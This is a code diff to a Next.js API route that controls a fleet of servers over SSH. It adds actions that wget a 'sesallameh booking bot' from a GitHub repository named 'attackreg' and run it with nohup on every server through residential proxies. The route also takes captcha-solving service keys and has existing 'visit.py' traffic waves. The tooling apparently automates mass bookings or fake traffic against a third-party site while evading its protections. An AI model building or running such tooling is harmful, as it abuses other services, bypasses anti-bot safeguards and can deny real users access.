@@ -100,7 +100,7 @@ export async function POST(req) {
   }
 
   try {
-    const { action, url, durationMin, servers, proxies, waveSize, stayTime, socketUrl, captchaApiKey, captchaService, forceMode, forceProtection } = await req.json();
+    const { action, url, durationMin, servers, proxies, waveSize, stayTime, socketUrl, captchaApiKey, captchaService, forceMode, forceProtection, instances } = await req.json();
     const serverList = (servers && servers.length > 0) ? servers : DEFAULT_SERVERS;
 
     if (action === 'setup') {
@@ -128,6 +128,85 @@ export async function POST(req) {
         })
       );
       return NextResponse.json({ results });
+
+    } else if (action === 'deploy-sesallameh') {
+      // Deploy the sesallameh booking bot script to all servers
+      const ghBase = 'https://raw.githubusercontent.com/fanarali881-eng/attackreg/main';
+      const deployCmd = `wget -q -O /root/sesallameh_bot.py '${ghBase}/sesallameh_bot.py' && wc -c /root/sesallameh_bot.py && echo "Sesallameh bot deployed"`;
+      
+      const results = await Promise.all(
+        serverList.map(async (server) => {
+          const r = await runSSHCommand(server, deployCmd, 30000);
+          return { host: server.host, ...r };
+        })
+      );
+      return NextResponse.json({ results });
+
+    } else if (action === 'start-sesallameh') {
+      const safeDuration = sanitizeNumber(durationMin, 5, 1, 1440);
+      const safeInstances = sanitizeNumber(instances, 3, 1, 10);
+
+      // Build proxy env vars
+      let proxyEnv = '';
+      if (proxies && proxies.length > 0) {
+        const p = proxies[0];
+        proxyEnv = `PROXY_USER='${(p.username || '').replace(/'/g, '')}' PROXY_PASS='${(p.password || '').replace(/'/g, '')}' PROXY_HOST='${(p.host || 'proxy.packetstream.io').replace(/'/g, '')}' PROXY_PORT='${(p.port || '31112').replace(/'/g, '')}'`;
+      }
+
+      const results = await Promise.all(
+        serverList.map(async (server) => {
+          const fullCmd = `kill -9 $(pgrep -f "sesallameh_bot.py") 2>/dev/null; sleep 1; ` +
+            `${proxyEnv} nohup python3 /root/sesallameh_bot.py ${safeDuration} ${safeInstances} > /root/sesallameh.log 2>&1 & ` +
+            `echo "Sesallameh bot started - ${safeDuration}min ${safeInstances} instances"`;
+          
+          const r = await runSSHCommand(server, fullCmd, 15000);
+          return { host: server.host, ...r };
+        })
+      );
+      return NextResponse.json({ results });
+
+    } else if (action === 'stop-sesallameh') {
+      const results = await Promise.all(
+        serverList.map(async (server) => {
+          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "sesallameh_bot.py") 2>/dev/null; echo "Sesallameh bot stopped"', 15000);
+          return { host: server.host, ...r };
+        })
+      );
+      return NextResponse.json({ results });
+
+    } else if (action === 'status-sesallameh') {
+      const results = await Promise.all(
+        serverList.map(async (server) => {
+          const r = await runSSHCommand(server, 'cat /root/sesallameh_status.json 2>/dev/null || echo "{}"; echo "---"; pgrep -f sesallameh_bot.py > /dev/null && echo "RUNNING" || echo "STOPPED"', 10000);
+          return { host: server.host, ...r };
+        })
+      );
+      
+      // Parse status from each server
+      const parsed = results.map(r => {
+        let status = { status: 'unknown', bookings: 0, errors: 0, elapsed: 0 };
+        let running = false;
+        if (r.output) {
+          const parts = r.output.split('---');
+          try {
+            const jsonPart = parts[0].trim();
+            if (jsonPart && jsonPart !== '{}') {
+              status = JSON.parse(jsonPart);
+            }
+          } catch(e) {}
+          running = r.output.includes('RUNNING');
+        }
+        return {
+          host: r.host,
+          status: r.status === 'error' ? 'error' : (running ? 'running' : 'stopped'),
+          bookings: status.bookings || 0,
+          errors: status.errors || 0,
+          elapsed: status.elapsed || 0,
+          error: r.error
+        };
+      });
+      
+      return NextResponse.json({ results: parsed });
 
     } else if (action === 'start') {
       const safeUrl = sanitizeUrl(url);
@@ -169,7 +248,7 @@ export async function POST(req) {
     } else if (action === 'stop') {
       const results = await Promise.all(
         serverList.map(async (server) => {
-          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; killall -9 python3 2>/dev/null; echo "Stopped"', 15000);
+          const r = await runSSHCommand(server, 'kill -9 $(pgrep -f "visit.py") 2>/dev/null; kill -9 $(pgrep -f "sesallameh_bot.py") 2>/dev/null; killall -9 python3 2>/dev/null; echo "Stopped"', 15000);
           return { host: server.host, ...r };
         })
       );
